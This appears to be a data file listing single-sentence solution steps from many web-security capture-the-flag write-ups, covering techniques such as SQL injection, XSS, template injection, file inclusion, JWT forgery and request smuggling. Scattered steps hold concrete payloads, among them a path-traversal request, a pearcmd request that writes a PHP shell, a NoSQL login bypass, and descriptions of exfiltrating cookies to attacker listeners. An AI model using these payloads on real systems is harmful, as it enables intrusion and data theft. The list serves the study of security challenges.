    "Spot a handler function in the 'auth.ts' file that stores the request body object into a database",
    "Discovered that `||` is the SQLite concatenation operator and is used to join strings together",
    "Identify that you need change the 'admin' field to 'true'. However, you need the secret key due to Flask's hash based on session data, timestamp, and the secret key",
    "Realized that if LFI is used to read a file including PHP code, it will be executed by the server",
    "Discovering that if a zip file with 'docker-entry' in its name is uploaded, the program will execute the script within a docker container with greater access (runs as `uploaded` user) as opposed to executing normally (runs as `nobody` user)",
    "Extracted the contents of the zip file which included bundle.js and index.html files",
    "Visit the private section of the website with the modified cookie to get the flag",
    "Check the cells and find a formula",
    "Understand that if the expected value does not match 'solution', the JWT field 'failed' is set to 'true'.",
    "Used the following json to successfully upload the updated grades",
    "Create and test the final URL 'http://marcodowno-01.play.midnightsunctf.se:3001/markdown?input=[\" onerror=\"alert(1)\"](http://x)' to trigger the XSS alert attack.",
    "Understand that 'ElementInclude.include(root)' allows the use of XInclude directives",
    "Started looking for a payload to trigger the XSS, looked at the unit tests for the SAFE_FOR_JQUERY flag on the DOMPurify's GitHub",
    "Attempt to show differences between the commit when the flag was removed and the commit when it was present",
    "Identify two packets, #261 and #263, in the capture related to a JWT-related endpoint",
    "Executed another HTTP request to extract the content of the 'whatsthis' table",
    "Downloaded the 'dirstate' file from the target server.",
    "Extract flag from response.",
    "Login to get a token using that token to readfile and read the `68696e742e747874` (hex decoded as hint.txt)",
    "Identified PHP-Proxy (all versions) have a Local File Inclusion (LFI) vulnerability.",
    "Wrote a script which: constructs a command to be executed, creates a payload using python pickle containing a command execution statement, sleeps for half a second, reads the just created payload, and then sends it to the challenge webpage URL using a POST request",
    "Discovered that the website was hosted on an Apache Traffic Server 7.1.1 and the Nginx server 1.15.5.",
    "Capturing the Admin Bot's cookies sent by the executed payload to the netcat listener",
    "Connect to source code link to reveal the structure of the site",
    "Identified the relevant exploit and supporting materials related to the CVE",
    "Check the cookies of the webpage and find a 'token' key containing a JWT (JSON Web Token)",
    "Managed to extract a very long alphanumeric password from the database",
    "Modify 'content.xml' to include payload which links to the '/flag' file",
    "Understood from the JSON response that the flag was in the comment within the response itself",
    "Tried to bypass password check with SQL injection but found that the flag did not print even though the login was successful",
    "Injected email queue in rabbitmq with an 'attachment' parameter to trigger an email with the flag as content",
    "Understand that the challenge is referring to Same-Origin XSS attack",
    "Found out that the correct user id is needed for admin access, instead of the password.",
    "Crafted a final payload that exploits the bypass and rewrites the document to `/terjanq/`.",
    "Decide to pollute 'process.argv[2]' with a command injection payload before importing the 'changelog.js' file.",
    "Identified that the flag was formed by computing the MD5 hash of the username, password and a salt",
    "Adding the new JWT to the cookie to impersonate an admin.",
    "Craft SQL injection payload that always returns true and comments out the rest of the query",
    "Recognized that a Redis database was being utilized with the hostname as 'redis' and port 6379",
    "Conducted a Burp intruder scan on 10.35.2.134/call_api.php to identify potentially connectable hosts.",
    "Discovered that the script could be bypassed by disabling JavaScript from the browser or by using a proxy tool to intercept and repeat the request",
    "Using this anomaly, form a request to the proxy with the 'uri' parameter having a malformed path such as //ATTACKER-URL, causing the proxy to send a request to the specified URL",
    "Uncover that the tar utility creates a checkpoint after every 10 records by default and each record is made up of 20 blocks of 512 bytes each.",
    "Improved payload further by using different JavaScript functions to reduce the character count",
    "Created an exploit script using 'window.open()' on the exploit server to control 'window.name'",
    "Gaining a shell and listing the directory.",
    "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
    "Due to frontend processing, this resulted in the same verified message but carrying a different meaning",
    "Upload the generated barcode to the website.",
    "Study source files, specifically server.js",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Noticing the main class, Database, which creates, retrieves and generates tokens for notes.",
    "Understand that it's possible to upload an image with RGB parameters.",
    "The value of 'likeCookie' was then changed to true which resulted in a response message suggesting the value could range from 1 to 20.",
    "Discovered that arbitrary HTML submitted is rendered by the admin's browser. Verified this by submitting HTML enclosed in script tags to catch the HTTP request.",
    "Locate the POST requests to '/login.php' and note the presence of 'username', 'cnonce', and 'hash' parameters.",
    "Built Remote Code Execution (RCE) payload using '().__class__.__subclasses__.__getitem__(x)' method, with 'x' corresponding to the index of 'subprocess.Popen'",
    "Observe HTTP response and try using /search as per instructions in response.",
    "Used the 'flag' value on the '/com/seaerch/' endpoint which provided another part of the flag.",
    "Found a PHP webpage with a login.php that gives a 403 Forbidden error.",
    "Identified the use of a message event handler that had to be exploited in tandem with a '.jsapi.tech' subdomain takeover.",
    "Execute the function, thus exploiting the SQL injection vulnerability",
    "Analyzed the source code of the web application and noticed that body-parser is set to allow arrays and objects",
    "Defined a template for the final PDF files which will hold identical initial content and MD5 hashes, but will diverge at a certain point to become two different PDFs.",
    "View the contents of the directory using 'll'",
    "Attempted to escalate privileges by changing the 'uid' from 100 to 1 using the previous payload",
    "Generate a barcode with a SQL injection that returns all rows using an online barcode generator.",
    "Sent another request to read the content of the `flag.txt` file",
    "Exploited LFI vulnerability to discover how the website stores the 'name' parameter",
    "Retrieved the flag from the table content",
    "Decided to examine the source code of the page closely using an Integrated Development Environment (IDE)",
    "Retrieved the flag '35c3_password_saltf1sh_30_seconds_max'",
    "Determined the 'value' attribute, which corresponded to the count of credits, is at the end of the Java serialized object",
    "Used the BZR Check command to find any missing files and downloaded files from the target server.",
    "Create a new user on the site since the default user role cannot be modified.",
    "Identify the version of SQL Alchemy being used via the requirements.txt file",
    "Perform a POST request with the calculated 'passcode'",
    "Used the obtained OTP to verify and login into the system",
    "Initialize an empty password string for storing the inferred password.",
    "Discovered that using a sufficiently large 'id' can cause an out-of-bound memory read.",
    "Added the header X-Forwarded-For, but got an error message that the IP address was not in the whitelist",
    "Accessed the website which provides a functionality to create a custom cowfile via the following URL: `http://3.93.128.89:1204/cow_designer`. The cowfiles are script files that utilize the cowsay command to print messages.",
    "Used Python-random-module-cracker tool to predict the next 'nonces'",
    "Executed a GET request `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1` to exploit this vulnerability",
    "Adjusted the '$method' attribute in the serialized object to be 'doit'.",
    "Successfully use the same CAPTCHA code to test two different MFA tokens by sending them both in the same HTTP request.",
    "Observed that the settings endpoint sets the settings for 'ctx.state.user', which equals to the 'username' cookie, and the setting name is user-controlled",
    "Inspect the webpage",
    "Run PHP commands to verify the treatment of '0e...' strings as 0.0 in PHP",
    "The flag was 'RS{4!way5_Ke3p-m0v1ng}'",
    "Extracted the count of PDF pages from each PDF file.",
    "Observed that the web proxy application is 'Powered by PHP-Proxy' and followed the provided link to the PHP-Proxy GitHub repository.",
    "Accessed the list functionality with the spoofed cookies",
    "On authenticating with this user, redirected to a URL containing the flag",
    "Created a phar file with custom command from 'phpggc' repo",
    "Acquired the flag upon login.",
    "Try various inputs including special characters and note the responses",
    "Inspected the source code of the webpage and found an image tag with an onclick track event",
    "Find out the decryption key by using the 'key_id'",
    "Navigated to the site's main page with the authenticated session",
    "Found out that 'pkg' is an object containing the 'package.json' fields and 'pkgPath' is the path to this package",
    "Leveraged 'lower' filter to bypass 'class', 'subclasses', and 'getitem' strings",
    "Noticed that the PHP configuration has several functions disabled, but 'scandir' and 'file_get_contents' are not disabled",
    "The flag is now presented, successfully completing the CTF challenge",
    "Formulated a Property-Oriented Programming (POP) chain for exploiting the identified vulnerability",
    "Send a POST request with the crafted payload to the target URL.",
    "Identified the possibility of XSS in a user's profile.",
    "Included a \\n character in a chunk extension in the second part of the challenge, to exploit a difference in how ATS and Waitress process end-of-line symbols.",
    "Use a payload to return all the subclasses",
    "Checked how the OTP verification is performed by analyzing the provided source code",
    "Found the flag in the source code",
    "Users were redirected to '/callback' on the frontend application",
    "Identified a potential SQL injection point in the 'moneys=' parameter",
    "The task was to find out the correct password in an input field on the provided webpage",
    "Analyzed the webpage and discovered two strange cookies: 'frequency' and 'transmissions'",
    "Identify a javascript file responsible for crafting the XML envelope",
    "Launched remote commands using the Python script",
    "Authenticated to the system and found that the 'login' method in [dogooo_comments.py](dogooo_comments.py) uses Python 3's f-Strings functionality which can be used to call methods",
    "Downloaded the 'pack-names' file from the target server.",
    "Identified a potential SQL injection vulnerability",
    "Identified there is a potential for a redis injection flaw in the refresh_session() function, where the user's sessionID is used in a redis eval() call with a lua script",
    "Identify hint from the response suggesting length extension attack with password length less than 30 characters",
    "Identified that developers may have used blacklisting to prevent path traversal by replacing certain string patterns",
    "Discovered that headless mode of Chrome doesn't perform cache partitioning, allowing the cache probing attack to succeed",
    "Realized the login site has filters applied to the quotation marks",
    "Messages and signatures were verified by the frontend",
    "Conducted a scan for the 172.16.2.0/24 subnet using the X-Forwarded-For header with a tool like Burp Suite Intruder.",
    "Note the returned HTML and the allowed HTTP operations: 'GET', 'POST', 'HEAD', 'OPTIONS'",
    "Examine the `.git/logs/HEAD` file to find commit IDs and determine when the flag was removed from the source",
    "Analyze the browser cookies and find one named 'admin_id : 0'",
    "Signed the Flask cookie with the desired username to authenticate as 'root'",
    "Set the cookie as 'user=root'",
    "Notice the use of 'ElementInclude.include(root)' in the code",
    "Used `attr()` to pass the blacklisted characters, this Jenja2 built-in filter gets an attribute of an object and the payload `/submit?value={{()|attr(request.args.c)}}&c=__class__` resulted in `().__class__` being evaluated and displayed to the user",
    "Accessed the challenge website with the given URL",
    "Discovered that the code uses a blacklist Regex to prevent the execution of certain strings or functions",
    "Explored the visible scripts and source code files",
    "Visited the URL `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole` to find a Werkzeug console",
    "Unintended solution used the property 'Lazy-loading' of an image to check if an extra div is rendered when search is correct.",
    "Logged into the application",
    "Implement the series of steps in a Proof of Concept script",
    "Receive the flag from the listening host",
    "Created an XPATH injection payload",
    "Understood that the goal of the CTF challenge is to fetch the environment variable 'flag'",
    "Formulated a strategy to provide a custom host and redirect anything to '127.0.0.1/api/true-answer' for capturing the flag",
    "There is a Use After Free (UAF) when deleting a node, with the HEAD never updating if the first index is removed.",
    "Found the flag 'zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}' in the source code",
    "Identified that the 'shell_exec' function may be unsanitized, allowing for potential shell command exploits.",
    "Pass the decoded cookie directly to the 'app.render' function as the options",
    "It puts a `SECCOMP_MODE_STRICT` seccomp sandbox into play before executing the input, allowing only read, write, and exit syscalls",
    "Used python3 payload.py | nc localhost 8000 to see the second flag on the receiving server.",
    "Identify that the challenge consists of 3 services - Traefik (a HTTP proxy), a Python microservice, and a Go microservice",
    "Listed the directory using 'ls -al' command",
    "Visiting the webpage and analyzing the response headers to guess that the server was using FastAPI",
    "Ensure the trailing '.ping-proxy/ping' turns into a URL fragment by appending '#' at the end of the 'fqdn', which simply makes the final URL your public IP address",
    "Saw the webpage's source code, which is PHP",
    "Understand that crafting and serializing a custom 'access_log' object with the log_file set to '../flag' can potentially retrieve the flag due to the deserialization of the 'login' cookie",
    "Experiment with uploading images and manipulating RGB values.",
    "Identify that the `Login` object includes an MFA token and a `User` object.",
    "Notice that if the URL limit is hit, the origin of the page remains that of the parent window",
    "Connected to the website 138.247.13.115 and received a message indicating site is not served on this interface",
    "Submitted the URL so that it is visited by the bot.",
    "Noticed rate limiting being enforced on a per-email basis through a Redis store, which limits the number of OTP attempts to 3",
    "Recognize that the express.json() allows Object and Array types to be given as req.body.email and req.body.password",
    "Learn that the SQLite code that can be injected into the vulnerable order_by() function",
    "Reading the first flag with the `nobody` user permissions",
    "Found out from the footer that the application is 'Powered by PHP-Proxy'.",
    "Note that client's 'User-Agent' value is used in the encoding function and this value can be fetched from HTTP headers.",
    "Created a script to brute force the OTP by appending '%' to the email and incrementally changing the OTP",
    "Executed the Python script and found the correct value for the cookie 'otadmin' to be {\"hash\": 389}",
    "Attempt to use 'cat ../flag.txt' failed due to exceeding character limit",
    "Identified a form with 'username' and 'password' fields on the login page.",
    "Understand that 'parse=\"xml\"' raises an error when used with non-XML content",
    "Check if the body JSON value 'solution' is equal to the expected CAPTCHA.",
    "Decode the base64 string which reveals the flag '35c3_this_flag_is_the_be5t_fl4g'",
    "Opened the website, which served an 'index.html' file containing information about 'Brobot', understood as another hint towards 'robots.txt'",
    "Observe output hinting character set",
    "Attempt to login once the admin login page is discovered, which generates a cookie",
    "Examined HTML source code to understand the layout and elements of the webpage and its voting system.",
    "Discovered RCE vulnerability through pre-installed 'pearcmd.php'",
    "Tried '127.0.0.1;ls /root' in URL but no output was returned.",
    "Discover another endpoint: http://challenges.auctf.com:30022/hidden/nextstep.php to contact based on the decoded strings",
    "Received a response containing a new flag value",
    "Used the php bug to bypass strip_tags and inject an 'a' tag.",
    "Created a final payload by modifying the initial JavaScript payload and replacing the string 'alert(1)' with the converted string of our JavaScript payload that fetches localStorage.getItem('flag') and sends it to the attacker's URL.",
    "Incorporated delays between consecutive requests to account for pipelining in the server",
    "Conducted fuzzing to discover that HTML injection is possible",
    "Send the code to the site administrator using `https://xmas.2020.chall.actf.co/report`",
    "Navigate to the sources tab in the inspection tools and open the JavaScript file",
    "Found the login credentials in the logs",
    "Described the 'words' table and the '1919810931114514' table using the `1'; DESCRIBE tablename;` command.",
    "The Firestore environment contained a canvas in which users could color pixels which get stored into Firestore repository",
    "In the robots.txt file, found that /signing.pem is disallowed.",
    "Submitted the flag present in the JSON response",
    "Exploiting Shellshock vulnerability to determine current user is 'www-data'",
    "Identified an Insecure Direct Object Reference (IDOR) vulnerability due to the absence of ownership verification during file requests",
    "Identified that I need to use the phar:// uri in the XML External Entity vulnerability to make PHP deserialize my object of the Image type.",
    "Realize that the decryption key can be obtained by supplying a 'key_id' in the HTTP headers",
    "Logged in using `manager:bigsanta!` credentials but `admin:tryharder` credentials were not valid.",
    "URL encoded both binary strings",
    "Uploaded PHP shell",
    "Return to the website and login using the found password.",
    "Used SQLMap to identify injection vectors and dump the database.",
    "Inspect the Python file provided in the challenge, which includes some regex functionality",
    "Identified 'the_real_flag' user and suspected the flag to be in the 'wordpass' value",
    "Consider ways to apply the Template Injection exploit with the 'setter' and 'getter' properties for 'key', even if you do not need to achieve Remote Code Execution (RCE).",
    "Executed the URL, successfully reading the remote files.",
    "Observed that server side validation checks for valid user but not legitimate ownership for file retrieval at `/users/<username>/files/<filename>`",
    "Evaluate the Python microservice, note that it allows the running of arbitrary commands when the GET method is used",
    "Review the jQuery documentation and find a feature that allows specifying a remote document portion to insert",
    "Investigate the HTML code of the website and identify fields that need to be extracted",
    "Registered a new account on the provided URL",
    "Connect to the URL provided in the challenge http://jh2i.com:50000",
    "Used curl command to send a GET request to the given URL http://challenge.nahamcon.com:31428/",
    "The website interface allows for creating redirect URLs, changing the admin's password, and reporting URLs.",
    "Guessed that an 'application/x-www-form-urlencoded' parameter must be used to perform the search operation.",
    "Discover the backslash character itself isn't escaped and attempt to break out using '?cat=news\\\\''",
    "Logged in with the obtained credentials, noticed a change in website functionality",
    "Researched the trivia answer 'Fear the Old Blood'",
    "Create a JWT with the permissions set to 'admin' and the secretid set to a string that does not exist in the secrets array",
    "Find a HTTP request smuggling issue with incorrect parsing of chunk extensions",
    "Learned that backticks (`) could be used instead of parentheses in JavaScript",
    "Set up socks correctly",
    "Visited 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php' to execute the crafted payload",
    "Accessed site at :5555",
    "Initiate exploitation with HTTP POST request to sell flag with negative price",
    "Identified that control over 'request.body.converter' can be achieved",
    "Realised that the generated PDF had the flag inside",
    "Identified a JavaScript that copied the email value entered in the input field to the username field.",
    "Recognized the potential for Server-Side Template Injection (SSTI), due to the 'add_money_to_login' function added to the template context",
    "Upon receiving a missing rocket name error, a random rocket name was added to the POST request body",
    "Attempted opening a webshell due to failure of getting a reverse shell.",
    "Analyze the source files and spot code vulnerable to SQL injection in index.php",
    "Analyze target website",
    "Changed User-Agent to 'Linux Xbox' using curl",
    "Performed a curl command at localhost:55043/login.php with the X-Forwarded-For header set to 172.16.2.24.",
    "Tested locally for potential RCE by POST-ing data that includes `constructor/prototype/outputFunctionName`",
    "Injected cookie named 'username' with value 'admin'",
    "Cause a GET request to the Python microservice to be executed by smuggling it inside a POST request made to the Go microservice, using HTTP request smuggling",
    "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
    "Determined the position of the column used to return data, it was found to be the last one.",
    "Flipped one random bit in the wordpress installation",
    "Otherwise, return that the balance is exceeded and the queried amount.",
    "Used sqlmap on the saved login request to attempt to extract database details",
    "Recognize 'SSTI' in the given URL as a hint to 'Server-Side Template Injection' vulnerabilities",
    "Submitted an HTTP request with the modified cookie",
    "Attempted to log in the admin to a dummy Twitter account and share the password.",
    "Identify the classes and methods involved in the authentication process.",
    "Identified the application as a WordPress site where some links are clickable and reveal 2 blog posts",
    "Determine that window's history length can reveal whether a redirection occurred, thus allowing to approximate the user's balance.",
    "Complete the payload to visualize and read contents of 'flag.php'.",
    "Analyzed the composition of the sessions table and found the 'user_id' column needed a foreign key from the user table.",
    "Recognized the platform as SQLite database",
    "Requested multiple 'nonces' from 'https://naas.2019.chall.actf.co/nonceify'",
    "Combined all the collected parts to form the complete flag :`CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`",
    "Extracting the flag from the Admin Bot's cookies",
    "Received different responses from the '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Retrieve the flag from the server response: `csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}`",
    "The 'data-last' attribute of the '#note-text-area' element, containing the victim's saved note, can be exfiltrated using CSS attribute selectors.",
    "Open the target URL and send an XSS with the stolen identifier so that the origin is the target URL",
    "Understand that DOCX files are actually a collection of XML files",
    "Assumed a Local File Inclusion (LFI) exploitation was required due to the upload page validation",
    "Attempt to follow admin, receiving a pending request response",
    "Referred to GitHub exploit pages: 'https://github.com/ambionics/phpggc' and 'https://github.com/ambionics/laravel-exploits'",
    "Studied the downloaded source code, finding 'flag.txt' can be read from an endpoint '/admin'.",
    "Sent the 'GET' request to the provided web page",
    "Flag was in the user agent so bot clicking our link gave us the flag.",
    "Tried to load an external resource (JavaScript or stylesheet) to observe any unusual behavior",
    "Triggered a JSONP response from the YouTube API by providing a callback parameter",
    "Inferred payload modification would be required to bypass these security measures by using repeated directory traversal sequences",
    "Created a PHP script to serialize an object for the exploit.",
    "Found what appeared to be a password",
    "Use Burp Suite to find that this method is being executed through websockets",
    "Used LFI to access and display the code of the 'delete' resource",
    "Observed the response for the manipulated request which returned a success message.",
    "Identified a Server Side Request Forgery (SSRF) vulnerability in the /api/image to FTP server",
    "Visited the provided URL",
    "Perfected payload for eval instruction",
    "Compressed and encoded to Base64 the malicious Java serialized object",
    "Analyze the source codes provided.",
    "Executed Prototype pollution to manipulate the 'accessGranted' attribute to bypass Access Denied error",
    "Request the website's 'news' category at '?cat=news'",
    "Increase commas input to three since the requirement is for three keys",
    "Analyze the Python code for the challenge that manages a market API.",
    "Created a working script by replacing parentheses with backticks",
    "Identified the challenge as one requiring bypass of an Angular application setup behind an Nginx reverse proxy",
    "Define the URL of the website that the SQL Injection will be performed on.",
    "Identified that the server uses 'Content-Length' header even if 'Transfer-Encoding' header exists, leading to a request smuggling vulnerability",
    "Read the challenge description thoroughly",
    "Crafted payload '/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,<POSITION>,1))='<GUESS>' to brute force the OTP character by character",
    "Identify the possibility of representing the localhost (127.0.0.1) in a different notation to bypass the restrictions set in the 'valid_ip' function",
    "Injected '<base href=\"http://HOST:PORT\">' into the profile via 'user['title']' or 'user['lab']'.",
    "Opened the developer tools and checked the network tab to find a script.js",
    "Once the correct timestamp format was identified, the timestamp was updated in the POST request",
    "Attempt file upload with specific HTML content to check for callbacks from server",
    "Access the source URL in the browser",
    "Found the flag to be 'rtcp{d0n't_g1ve_us3rs_db_a((3ss}'",
    "Use a debugging tool such as regex101 to view code specifics and ensure understanding",
    "Sent the payload to the server and received a list of users as a response, confirming the XXE vulnerability",
    "Due to the absence of 'nc' and any way to exfiltrate the flag, read the flag from '/var/secret' and write it to '/opt/mydank', wherein '/opt' is the web facing directory",
    "Recognizing the problem to be potentially related to Server-side Template Injection, begin to test this theory with 'handlebars', which previously had a known vulnerability in processing templates.",
    "Logged back in with escalated privileges",
    "Login with the registered user once, logout, then re-login to find the details of the desired user under the post search section",
    "Created a payload `\"><svg/onload=$.globalEval(name)` with length of '32 bytes' where 'name' is a short form of 'window.name' property",
    "Attempted to connect to the homepage but received an error of HTTP method not allowed.",
    "Finally, the entire query is compiled and executed.",
    "Decoded the base64 response to reveal the source code of 'config.php'",
    "Analysed the downloaded nginx.conf file and found that it uses proxy_pass to forward requests.",
    "Identified that the QR Code produced only contains the first character inserted",
    "Ran the script and obtained the complete flag",
    "Automate the process through script and execute the exploit to retrieve the flag ('flag{npm_devs_are_pretty_bad_at_fixing_bugs}') and complete the CTF.",
    "Waited for the process to complete and returned the content of 'satellite.txt'.",
    "Put all components of the attack together in a combined exploit that first executes an XSS to grant admin privileged access and then initiates RCE to read and externally send the flag",
    "Used a techinique to disguise a valid phar file as a JPEG image.",
    "Note that the server will retrieve a value of 'undefined' for secret['randomstr'] and will not attempt to verify the JWT because the algorithm is 'none'",
    "Analyzed the script.js content which contained some code that checks for a 4 digit pin and fetches the flag, depending on the pin being equal to the value of \u201cCONFIG.correctPin\u201d or not",
    "Understand by passing a serialized object into 'serialize.unserialize()', RCE can be achieved through a JavaScript Immediately Invoked Function Expression (IIFE)",
    "Discovered interesting information in the 'iam list-roles' and 'iam list-instance-profiles' responses",
    "Accessed the site and noticed command execution based on the URL parameter, 'host'.",
    "Received the flag as a result of the modified admin cookie",
    "Analyzed the provided PHP code for the application's API request handling.",
    "Guessed that `shell_exec` might be allowed on the website.",
    "Identified incoming cookies from the victim's browser carrying the 'secret' cookie, which contained the flag",
    "Received a note ID, note PW and link to the note.",
    "Note that the server does not perform security checks on the alg or secretid fields in the JWT",
    "Inspect the source code of the website to know what server-side checks are being done",
    "Created a CSRF payload that fetches /api/flag and makes a callback to the exploit server with the page contents. Utilized fromCharCode() to avoid escaping single and double quotes",
    "Encountered an obstacle where the password was longer than the max character limit allowed by the login page",
    "Manipulate the fact that sufficient validation does not ensure WebSocket connection came from a page hosted on localhost, hence domain starting with localhost could be used, such as localhost.zeyu2001.com",
    "Intercept the bot's browser cookie when it visits the sabotaged webpage",
    "Attempt to guess admin's subdomain and utilize the 'subdomain enumeration' technique when guessing proves unsuccessful",
    "Adjusted exploit path based on Twitter inspiration from similar challenges",
    "Accessed `/robots.txt` and found a public key.",
    "Identify that by simply modifying the `$query`, you can perform an SQL injection, and plan to modify it to bypass authentication.",
    "Install the required dependencies for s3scanner using 'pip install -r requirements.txt'",
    "Uploaded a PHP shell which can be executed by visiting the uploaded file",
    "Examine the URLs associated with different users and photos",
    "Discovered 'Report Vulnerability' message requiring a reflected XSS exploit",
    "Decided to use CSRF (Cross-Origin Request Forgery) attack to change the status to 'premium', the only missing piece is the 'token'",
    "Used 'cat index.php' command to see the code",
    "Made a POST request to the server with a calculation statement",
    "Signed the token using the retrieved public key which the server misconstrued as an HMAC private key due to the vulnerability",
    "Necessary adjustments are made to the injection to fit the limitations, wrapping unnecessary parts of the query in [] to create a valid query.",
    "Decoded the base64 value to get the text 'cat index.txt'",
    "Ran the shell script by visiting the URL 'http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/'",
    "Check the 'Content-length' response header in each request to identify if the chosen character is correct",
    "Used `1'; SHOW TABLES;` to get a list of table names in the database.",
    "Understand the requirements to pass the login authentication that includes correct username, password, and a Multi-factor Authentication (MFA) token.",
    "Inspect the functionality of the 'minimag' and 'bbcode' commands, which are used for parsing content into HTML in the post_view.tpl file",
    "Encode the payload to base 64",
    "Observe the flag utflag{n3xt_y3ar_go1ng_bl1nd} found in the returned data",
    "Attempted the third web Gauntlet where the length requirement is reduced",
    "Opened link 'very.uniquename.xyz:2052', observed the page showing logos of Xbox and Linux",
    "Some research shows there is a CVE for this, and the Laravel version were working with is vulnerable",
    "Use cURL tool to set language headers to Swedish",
    "Used JWT.io or jwt_tool.py to decode the cookie.",
    "Checked the cookies to find a value for 'confidential_documents', indicating another potential API call",
    "Triggered the XML payload on the application, leading to the remote file read operation.",
    "Because this method is similar to DNS Rebinding, consider using a tool such as singularity to set up this type of server.",
    "Identify that the first obstacle is HTTP request smuggling between ATS and Puma",
    "Sent a JSON body containing 'username': 'admin' and 'password': {\"$gt\": \"a\"}, taking advantage of NoSQL's $gt (greater than) operator to bypass the password check",
    "Used `1'; USE information_schema; SHOW TABLES;` to get a list of tables in the 'information_schema' database.",
    "Checked 'Is it a leap year?' and 'I agree Security Questions are Bad.' checkboxes",
    "Entered ?source=1 as an HTTP parameter to retrieve the PHP source code",
    "Inspected page source and found a link for an example json file",
    "Inject entity 'xxe' pointing to the required file 'file:///flag.txt' in the 'app.xml'",
    "Wrote a PHP payload to '/tmp/pwn.php' using 'GET /?page=../../../../usr/local/lib/php/pearcmd.php&+config-create+/tmp/<?=system('/readflag')?>/*+/tmp/pwn.php HTTP/1.1'",
    "Executed curl command to make a POST request to the /login with the payload",
    "Finally, input the payload into the frontend for the application. Wait for a few seconds for the puppeteer instance to start and load the page. After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
    "Found a web app with a register and login page",
    "Downloaded the 'last-revision' file from the target server and replaced the existing 'last-revision' file.",
    "Examined the provided source code which uses a markdown library to convert markdown into HTML, runs DOMPurify, and does some validation",
    "The shellcode used JMP - CALL - POP technique to get the strings in registers",
    "Understand that the added cookie will be deserialized into an 'access_log' object and assigned to the $perm variable upon a request to 'authentication.php', which will inevitably fail and trigger the catch block where the flag is inadvertently printed due to the '__toString()' method of the 'access_log' class",
    "Found potential injection points in the feature allowing us to edit our bio in Markdown.",
    "To complete the challenge, send purchase requests to the API to increase loyalty point history a minimum of 1337 times.",
    "Understood many calls to 'window' were made in the CheckPassword function, which essentially represented 'window.localStorage.setItem'",
    "Noticed that incorrect answers submitted in the form fields are highlighted in red",
    "Discover a hardcoded password within the JavaScript file: 'I4m4M4st3rC0d3rH4x0rsB3w43'.",
    "Checked 'req.files' in check.js but 'next()' was called in each iteration causing express to continue",
    "Used Chrome DevTools to examine how the note taking app functions",
    "Referenced 'solv.py' to finalize the solution",
    "URL-encoded the payload.",
    "Started preparing an attack by attempting to exploit the RCE vulnerability by using the '-vf drawtext=...' option within the 'ffmpeg' command in the application to inject a 'grep' command to look for the flag in the main.py file.",
    "Examined the documentation for RFC5322 to understand what characters are allowed in the email parameter.",
    "Perform Insecure Direct Object Reference (IDOR) to directly access the flag with 'flag_id=3' using HTTP POST /buy request",
    "Use the newly generated token as a cookie and navigate to /flag",
    "Used backticks around the numeric table name to prevent it from being interpreted as a number.",
    "I wrote a small python script to get the flag",
    "A function is found in the code which validates the string of injection and it must not contain any element of a list of banned words including certain special characters.",
    "Created a new script element, added the appropriate `nonce` from the rest of the script tags, and set the script source to the data wanted to exfiltrate.",
    "Logged in with a random value and inspected cookies.",
    "Develop your own client: Armed with information on how packets are structured and how to determine the winning position, develop a client script that can win each round of the game. The python code shown uses requests to repeatedly play the game",
    "Switch 'astToJs' to 'evalCode' in order to execute custom code within the app",
    "Visited the URL provided in the problem statement.",
    "Seventh step: Created an attacker server to make 19 redirects.",
    "Opened the website and examined its interface.",
    "Access the challenge website 'http://filereader.darkarmy.xyz/'",
    "Understanding that gaining a shell inside the docker container could provide more privileges",
    "Examined the registration fields to understand what data is being submitted during the registration process",
    "Modify the '/decrypt' endpoint to decrypt the file using the found decryption key",
    "Identify the '|' operator as potentially useful, as it allows for matching of either of two separate regular expressions",
    "Display the contents of the file to retrieve the flag.",
    "Read the contents of the 'flag.txt' file, which is the flag",
    "Looked into database.py and noticed password is getting verified with passwordVerify",
    "Discovered an HTML comment about an unlinked source file, and downloaded this file",
    "Decided to leak the database name but had to devise a new strategy as this query was of type 'INSERT'.",
    "Validate the encoding function by checking if it produces the same encoded message as captured in unmasked WebSocket packets in Wireshark.",
    "Identified the application can upload TPL files",
    "Analyze the given files and find that it's a Python environment and the Python Pillow library is being used.",
    "Identifying a rule within the configuration file that replaces any 'secret' tags with the word 'Protected'",
    "Passed the earlier jwt token as parameter and received a response indicating a need for admin credentials",
    "Write a code in PHP that creates these custom objects (`Login`, `User`, `SQL`). The custom `Login` object contains the custom `User` object and the `$_correctValue` reference. The custom `User` object contains a custom `SQL` with the custom `$query`.",
    "Inspect the search feature of the provided platform",
    "The response for the second consequent request corresponded to '/flag' instead of '/' due to the request smuggling",
    "Retrieve the flag stored in the intercepted cookie",
    "Found students' emails exposed at https://wpiadmin.wpictf.xyz/topStudents",
    "Analyzed read files page and discovered that the website is vulnerable to LFI (local file inclusion)",
    "Created an 'id' file with the malicious payload and set its permissions to 777 to make it executable",
    "Authenticate successfully and gain access to the application",
    "Observed the HTTP response header, it indicated various constraints including inability to include external scripts and styles, embedding the site in iframe on an external site",
    "Take the screenshot of the flag and convert the image to text using OCR (Optical Character Recognition) to extract the flag",
    "Analyzed the HTML code of the page and found out that the guest sign in portal was not yet implemented",
    "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
    "Read the 'apache.conf' and highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Replace the existing flavor value in the cookie with 'chocolate'",
    "Retrieved the flag successfully from the website",
    "Consider that the debugging port is randomized from the getRandomPort function",
    "Analyzing 'cgi-bin/' directory discovers 'scriptlet' endpoint",
